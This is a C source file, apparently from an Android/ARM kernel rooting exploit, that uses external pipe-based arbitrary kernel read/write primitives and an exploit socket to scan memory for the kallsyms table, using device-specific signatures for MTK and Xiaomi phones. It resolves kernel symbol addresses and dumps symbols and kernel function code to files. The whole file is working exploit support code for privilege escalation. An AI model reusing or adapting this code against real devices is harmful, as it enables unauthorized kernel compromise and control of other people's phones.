#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <string.h>
#include "common.h"
#include "log.h"

#define KERNEL_START        0xc0000000UL
#define KERNEL_SEARCH_START 0xc0008000UL
#define KERNEL_SEARCH_STOP  (KERNEL_START + 1024 * 1024 * 0x10)
#define MIN_LEN             10000UL

#define KSYMS_MMAP_START    0x50000000
#define KSYMS_MMAP_SIZE     0x1000000
#define KSYMS_COPY_NUM      0x1000000


unsigned long ksyms_search_start;
unsigned long ksyms_search_stop;

unsigned long *ksyms_mmap_addr;
unsigned long ksyms_copied;

extern int socket_fd_exploit;

#define KSYM_NAME_LEN  128

unsigned long *ks_address = NULL;
unsigned long *ks_num = NULL;
unsigned char *ks_names = NULL;
unsigned long *ks_markers = NULL;
unsigned char *ks_token_tab = NULL;
unsigned short *ks_token_index = NULL;
unsigned long *ks_address_end = NULL;

extern int (*my_printk) (const char *fmt, ...);

#define USER_SPACE_RW    1
#define KSYMS_USER_SPACE 1

#if USER_SPACE_RW
#define INVALID 0xDEADBEEF
#define PIPE_READ_MAX (0x1000)

extern int write_at_address_pipe(void* address, void* buf, ssize_t len);
extern int read_at_address_pipe(void* address, void* buf, ssize_t len);

inline unsigned long read_k(unsigned long addr, unsigned long *buf, unsigned long size)
{
    return read_at_address_pipe(addr, buf, size);
}

inline unsigned long read_kl(unsigned long addr)
{
        unsigned long ret;
        if (read_at_address_pipe(addr, &ret, sizeof ret) > 0) {
                return INVALID;
        }
        return ret;
}

inline unsigned long write_kl(unsigned long addr, unsigned long val)
{
        if (write_at_address_pipe(addr, &val, sizeof val) > 0) {
                return INVALID;
        }
        return val;
}
#else

inline unsigned long read_kl(unsigned long addr)
{
        return *(unsigned long*)addr;
}

inline unsigned long write_kl(unsigned long addr, unsigned long val)
{
        *(unsigned long*)addr = val;
        return val;
}

#endif

#if KSYMS_USER_SPACE
#define READ(addr) (*(addr))

#else
#define READ(addr) read_kl(addr)

#endif

unsigned long ksyms_pat[] = {0xc0008000, /* stext */
			     0xc0008000, /* _sinittext */
			     0xc0008000, /* _stext */
			     0xc0008000 /* __init_begin */
};

/* CP8712 */
unsigned long ksyms_pat2[] = {0x00000000, /* __vectors_start */
			      0x00001000, /* __stubs_start */
                              0x00001004, /* vector_rst */
                              0x00001020, /* vector_irq */
                              0x000010a0, /* vector_dabt */
                              0x00001120, /* vector_pabt */
                              0x000011a0, /* vector_und */
                              0x00001220, /* vector_addrexcptn */
                              0x00001224, /* vector_fiq */
                              0x00001224, /* vector_ifq_offset */
                              0xc0008000, /* stext */
                              0xc0008000, /* _text */
                              0xc000807c  /* __create_page_tables */
};
unsigned long ksyms_pat3[] = {0xc00081c0, /* asm_do_IRQ */
			      0xc00081c0, /* _stext */
			      0xc00081c0 /* __exception_text_start */
};
/* MTK 3.4 内核 */
unsigned long ksyms_pat4[] = {0xc0008180, /* asm_do_IRQ */
			      0xc0008180, /* _stext */
			      0xc0008180 /* __exception_text_start */
};
/* 小米 2 */
unsigned long ksyms_pat5[] = {0xc0100000, /* asm_do_IRQ */
			      0xc0100000, /* _stext */
			      0xc0100000 /* __exception_text_start */
};
/* lovme */
unsigned long ksyms_pat6[] = {0x0,
			      0x1000,
			      0x1004,
			      0x1020,
			      0x10a0
};


static int checkPattern(unsigned long *addr, unsigned long *pattern, int patternnum) {
    unsigned long val;
    int i, cnt;

    val = READ(addr);

    if (val == pattern[0]) {
        cnt = 1;
        for (i = 1; i < patternnum; i++) {
		val = READ(addr + i);
            if (val == pattern[i]) {
                cnt++;
            } else {
                break;
            }
        }
	if (cnt == patternnum)
		return 0;
    }
    return 1;
}

static int check_pat(unsigned long *addr)
{
	unsigned long size;

	size = sizeof(unsigned long);
	if (checkPattern(addr, ksyms_pat, sizeof(ksyms_pat) / size) == 0) {
		return 0;
	} else if (checkPattern(addr, ksyms_pat2, sizeof(ksyms_pat2) / size) == 0) {
		return 0;
	} else if (checkPattern(addr, ksyms_pat3, sizeof(ksyms_pat3) / size) == 0) {
		return 0;
	} else if (checkPattern(addr, ksyms_pat4, sizeof(ksyms_pat4) / size) == 0) {
		return 0;
	} else if (checkPattern(addr, ksyms_pat5, sizeof(ksyms_pat5) / size) == 0) {
		return 0;
	} else if (checkPattern(addr, ksyms_pat6, sizeof(ksyms_pat6) / size) == 0) {
		return 0;
	}

	return 1;
}


int get_ksyms(void);

unsigned long ks_expand_symbol(unsigned long off, char *namebuf)
{
        int len;
        int skipped_first;
        unsigned char *tptr;
        unsigned char *data;
        unsigned char tmp;

        data = ks_names + off;
        len = (unsigned char)READ(data);
        off += len + 1;
        data++;

        skipped_first = 0;
        while (len > 0) {
                tptr = ks_token_tab +
                        (unsigned short)READ(ks_token_index + (unsigned char)READ(data));
                data++;
                len--;

                while((tmp = (unsigned char)READ(tptr))) {
                        if (skipped_first){
                                *namebuf = tmp;
                                namebuf++;
                        }
                        else {
                                skipped_first = 1;
                        }
                        tptr++;
                }
        }
        *namebuf = '\0';
        return off;
}

static long _lookup_sym_part(const char *name)
{
        char namebuf[KSYM_NAME_LEN];
        unsigned long i;
        unsigned int off;
        unsigned long total;

        if (ks_address == 0) {
                if(!get_ksyms())
                        return -1;
        }

        total = READ(ks_num);
        for (i = 0, off = 0; i < total; i++) {
                off = ks_expand_symbol(off, namebuf);
                if (strncmp(namebuf, name, strlen(name)) == 0)
                        return i;
        }
        return -1;
}

unsigned long lookup_sym_part(const char *name)
{
        long ret;

        ret = _lookup_sym_part(name);
        if (ret >= 0)
                return READ(ks_address + ret);

        return 0;
}

unsigned long lookup_sym_part_next(const char *name)
{
        long ret;

        ret = _lookup_sym_part(name);
        if (ret >= 0)
                return READ(ks_address + ret + 1);

        return 0;
}

unsigned long lookup_sym_part_pre(const char *name)
{
        long ret;

        ret = _lookup_sym_part(name);
        if (ret >= 0)
                return READ(ks_address + ret - 1);

        return 0;
}

static long _lookup_sym(const char *name)
{
        char namebuf[KSYM_NAME_LEN];
        unsigned long i;
        unsigned int off;
        unsigned long total;

        if(!get_ksyms())
                return -1;

        total = READ(ks_num);
        for (i = 0, off = 0; i < total; i++) {
                off = ks_expand_symbol(off, namebuf);
                if (strcmp(namebuf, name) == 0)
                        return i;
        }
        return -1;
}

unsigned long lookup_sym(const char *name)
{
        long ret;
        ret = _lookup_sym(name);
        if (ret >= 0)
                return READ(ks_address + ret);
        return 0;
}

unsigned long lookup_sym_next(const char *name)
{
        long ret;
        ret = _lookup_sym(name);
        if (ret >= 0)
                return READ(ks_address + ret + 1);
        return 0;
}

unsigned long lookup_sym_pre(const char *name)
{
        long ret;
        ret = _lookup_sym(name);
        if (ret >= 0)
                return READ(ks_address + ret - 1);
        return 0;
}

static unsigned short *find_kernel_symbol_token_index(void)
{
        int i = 0;

        while((unsigned char)READ(ks_token_tab + i) ||
              (unsigned char)READ(ks_token_tab + i + 1))
                i++;

        while ((unsigned char)READ(ks_token_tab + i) == 0)
                i++;

        return ks_token_tab + i - 2;
}

static unsigned char *find_kernel_symbol_token_tab(void)
{
        unsigned long *addr;

        addr = ks_markers + ((READ(ks_num) - 1) >> 8) + 1;

        while (READ(addr) == 0)
                addr++;

        return (unsigned char *)addr;
}
static unsigned long *find_kernel_symbol_markers(void)
{
        unsigned long *addr;
        unsigned long i;
        unsigned long off;
        int len;
        unsigned long total;

        total = READ(ks_num);

        for(i = 0, off = 0; i < total; i++) {
                len = (unsigned char)READ(ks_names + off);
                off += len + 1;
        }

        addr = (unsigned long*)((((unsigned long)(ks_names + off) - 1) | 0x3) + 1);

        while(READ(addr) == 0)
                addr++;

        addr--;

        return addr;
}

static unsigned char *find_kernel_symbol_names(void)
{
        unsigned long *addr;

        addr = ks_num + 1;

        while(READ(addr) == 0)
                addr++;

        return (unsigned char *)addr;
}

static unsigned long find_kernel_symbol_num(void)
{
        unsigned long *addr;

        if (ks_address == 0)
                return 0UL;

redo:
        addr = ks_address;

        while (READ(addr) >= KERNEL_START) {
                addr++;
        }

	ks_address_end = addr - 1;

        /* fake end, redo search */
        if ((unsigned long)ks_address_end < (unsigned long)ks_address) {
            ks_address++;
            goto redo;
        }

        while (READ(addr) == 0)
                addr++;

        return (unsigned long)addr;
}

static void fix_symbol_tab_addr(void)
{
        unsigned long val;

	if (ks_num == NULL)
		return;

        val = READ(ks_num) - 1;
	if ((unsigned long)(ks_address_end - ks_address) != val)
		ks_address = ks_address_end - val;
}


static unsigned long *find_kernel_symbol_tab(void)
{
        unsigned long *p;
        unsigned long *addr;
        unsigned i = 0;
        unsigned long v1, v2;

        p = (unsigned long*)ksyms_search_start;


        while ((unsigned long)p < ksyms_search_stop) {
                addr = p;
                i = 0;
                v1 = READ(addr);
                if (v1 >= KERNEL_START) {
                        while ( i < MIN_LEN ) {
                                v2 = READ(addr + 1);
                                if (v2 >= KERNEL_START
                                    && v2 >= v1) {
                                        addr++;
                                        i++;
                                        v1 = READ(addr);
                                        continue;
                                }
                                break;
                        }

                        if (i == MIN_LEN)
                                return p;
                }
                p += i+1;
        }

        return 0;
}

static unsigned long *find_kernel_symbol_tab_pat(void)
{
        unsigned long *p;


        p = (unsigned long *)ksyms_search_start;

        while ((unsigned long)p < ksyms_search_stop) {
		if (check_pat(p) == 0)
			return p;
		p++;

	}
	return 0;
}

int get_ksyms(void)
{
        int var;

        if ((unsigned long)&var < KERNEL_START) {
                if (ks_address != NULL && ks_address < KERNEL_START)
                        return 1;
                ksyms_search_start = KSYMS_MMAP_START;
                ksyms_search_stop = KSYMS_MMAP_START + KSYMS_MMAP_SIZE;
        }
        else {
                if (ks_address != NULL && ks_address >= KERNEL_START)
                        return 1;
                ksyms_search_start = KERNEL_SEARCH_START;
                ksyms_search_stop = KERNEL_SEARCH_STOP;
        }

	ks_address = find_kernel_symbol_tab_pat();
	if (ks_address == 0) {
		ks_address = find_kernel_symbol_tab();
	}

        if (ks_address == 0) {
                //print("not find ksymbol_tab\n");
                return 0;
        }
        else {
                //print("kallsyms_address = %p\n", ks_address);
        }
        ks_num = (unsigned long*)find_kernel_symbol_num();
        /* if (ks_num) { */
        /*         print("kallsyms_num =%lu\n", *ks_num); */
        /* } */

	/* fix ks_address by ks_num */
	fix_symbol_tab_addr();

        ks_names = find_kernel_symbol_names();
        /* if (ks_names) */
        /*         print("kallsyms_names addr = %p\n", ks_names); */
        ks_markers = find_kernel_symbol_markers();
        /* if (ks_markers) */
        /*         print("kallsyms_markers addr = %p\n", ks_markers); */

        ks_token_tab = find_kernel_symbol_token_tab();
        /* if (ks_token_tab) */
        /*         print("kallsyms_token_tab addr = %p\n", ks_token_tab); */

        ks_token_index = find_kernel_symbol_token_index();
        /* if (ks_token_index) */
        /*         print("kallsyms_token_index addr = %p\n", ks_token_index); */

        return 1;
}


unsigned long *init_ksyms_map() {

    ksyms_mmap_addr = mmap(KSYMS_MMAP_START, KSYMS_MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, -1, 0);
    if (ksyms_mmap_addr == MAP_FAILED) {
        ERROR("初始化内核符号映射失败. \n");
        return 0;
    }

    memset(ksyms_mmap_addr, 0, KSYMS_MMAP_SIZE);
    ksyms_copied = 0;

    return ksyms_mmap_addr;

}

unsigned long copy_ksyms()
{
    unsigned long copy = KSYMS_COPY_NUM;
    unsigned long count;

    if (ksyms_copied + copy > KSYMS_MMAP_SIZE)
        copy = KSYMS_MMAP_SIZE - ksyms_copied;

    if (USER_SPACE_RW) {

        for (count = 0; count < (copy / PIPE_READ_MAX); count++) {
            read_k(ksyms_copied + KERNEL_SEARCH_START,
                   (unsigned long*)ksyms_mmap_addr + (ksyms_copied / sizeof(unsigned long)),
                   PIPE_READ_MAX);
            ksyms_copied += PIPE_READ_MAX;
        }

    }
    else {
        for (count = 0; count < (copy / sizeof(unsigned long)); count++) {
            *((unsigned long*)ksyms_mmap_addr + (ksyms_copied / sizeof(unsigned long))) = *(unsigned long*)(KERNEL_SEARCH_START + ksyms_copied);
            ksyms_copied += sizeof(unsigned long);
        }
    }

    return copy;
}

void unmap_ksyms()
{
        if (ksyms_mmap_addr)
                munmap(ksyms_mmap_addr, KSYMS_MMAP_SIZE);
}


int dump_kallsyms(const char *path)
{
        FILE *fp;
        char namebuf[KSYM_NAME_LEN];
	unsigned long off;
	unsigned long total;
        unsigned long i;

        if (ks_address == NULL)
                return 1;

	printf("extract kallsyms form memory!\n");
	fp = fopen(path, "w");
	if (fp == NULL) {
                printf("unable to create file %s!\n", path);
                return 1;
	}

	total = *ks_num;
	for (i = 0, off = 0; i < total; i++) {
                off = ks_expand_symbol(off, namebuf);
                fprintf(fp, "%p => %s\n", *(ks_address + i), namebuf);
	}

	fflush(fp);
	fclose(fp);
        return 0;
}

int dump_kernel_text(const char *func, unsigned long size, const char *path)
{
	FILE *fp;
        unsigned long *func_addr = NULL;
        unsigned char buf[PIPE_READ_MAX];
        unsigned long nread;

        func_addr = lookup_sym(func);
        if (func_addr == NULL) {
                printf("can not find addr for %s\n", func);
                return 1;
        }

        printf("dump text of kernel function %s\n", func);
        fp = fopen(path, "w");
        if (fp == NULL) {
		printf("unable to create file!\n");
		return 1;
        }

        while (size) {
                if (size > PIPE_READ_MAX)
                        nread = PIPE_READ_MAX;
                else
                        nread = size;

                if (read_k(func_addr, buf, nread)) {
                        perror("read_k");
                        return 1;
                }

                fwrite(buf, 1, nread, fp);
                size -= nread;
        }
        fflush(fp);
        fclose(fp);

	return 0;
}
